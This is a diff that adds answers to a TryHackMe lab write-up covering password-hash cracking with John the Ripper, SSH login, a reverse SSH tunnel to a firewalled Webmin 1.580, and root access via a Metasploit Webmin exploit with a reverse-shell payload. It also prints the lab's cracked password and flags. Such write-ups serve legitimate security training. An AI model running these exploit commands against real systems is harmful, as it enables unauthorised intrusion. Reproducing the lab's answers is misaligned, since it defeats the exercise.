@@ -135,20 +135,35 @@ If you are using a low-powered laptop, you can deploy a high spec'd Kali Linux m
 
 Deploy your own [here](https://tryhackme.com/room/kali)!
 
-Once you have JohnTheRipper installed you can run it against your hash using the following arguments:
+* Once you have JohnTheRipper installed you can run it against your hash using the following arguments:
 
-![task4-john](./images/task4-john.png)
+	![task4-john](./images/task4-john.png)
 
-**hash.txt** - contains a list of your hashes (in your case its just 1 hash)
-**--wordlist** - is the wordlist you're using to find the dehashed value
-**--format** - is the hashing algorithm used. In our case its hashed using SHA256.
+	**hash.txt** - contains a list of your hashes (in your case its just 1 hash)
+	**--wordlist** - is the wordlist you're using to find the dehashed value
+	**--format** - is the hashing algorithm used. In our case its hashed using SHA256.
+
+	Create file hash
+
+	![task4-hash](./images/task4-hash.png)
 
 * What is the de-hashed password?
 
-* Now you have a password and username. Try SSH'ing onto the machine.
+	`videogamer124`
+
+	```
+	john hash.txt -w=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+	```
+
+	![task4-crack](./images/task4-crack.png)
+
+Now you have a password and username. Try SSH'ing onto the machine.
 
 * What is the user flag?
+	
+	`649ac17b1480ac13ef1e4fa579dac95c`
 
+	![task4-flag](./images/task4-flag.png)
 
 ## Task 5 - Exposing services with reverse SSH tunnels
 
@@ -174,6 +189,10 @@ If we run **ss -tulpn** it will tell us what socket connections are running
 |-n|Doesn't resolve service names|
 
 * How many TCP sockets are running?
+	
+	`5`
+
+	![task5-tulpn](./images/task5-tulpn.png)
 
 We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!
 
@@ -185,7 +204,17 @@ Once complete, in your browser type "localhost:10000" and you can access the new
 
 * What is the name of the exposed CMS?
 
+	`Webmin`
+
+	![task5-tunel](./images/task5-tunel.png)
+
+	![task5-webmin](./images/task5-webmin.png)
+
 * What is the CMS version?
+
+	`1.580`
+
+	![task5-version](./images/task5-version.png)
 
 ## Task 6 - Privilege Escalation with Metasploit
 
@@ -194,3 +223,41 @@ Using the CMS dashboard version, use Metasploit to find a payload to execute aga
 ### Answer the questions below
 
 * What is the root flag?
+	
+	``
+
+	* Searchsploit
+	
+		```
+		search webmin
+		```
+	
+		![task6-searchsploit](./images/task6-searchsploit.png)
+
+	* Use exploit
+	
+		```
+		use exploit/unix/webapp/webmin_show_cgi_exec
+		set payload cmd/unix/reverse
+		set RHOSTS localhost
+		set USERNAME agent47
+		set PASSWORD videogamer124
+		set SSL false
+		set LHOST tun0
+		exploit
+		```
+
+		![task6-use](./images/task6-use.png)
+
+	* Interact with sessions
+	
+		![task6-sessions](./images/task6-sessions.png)
+
+	* Run python to excecute bash shell & Get the flag
+	
+		```
+		python -c ‘import pty; pty.spawn(“/bin/bash”)’
+		```
+
+		![task6-flag](./images/task6-flag.png)
+	
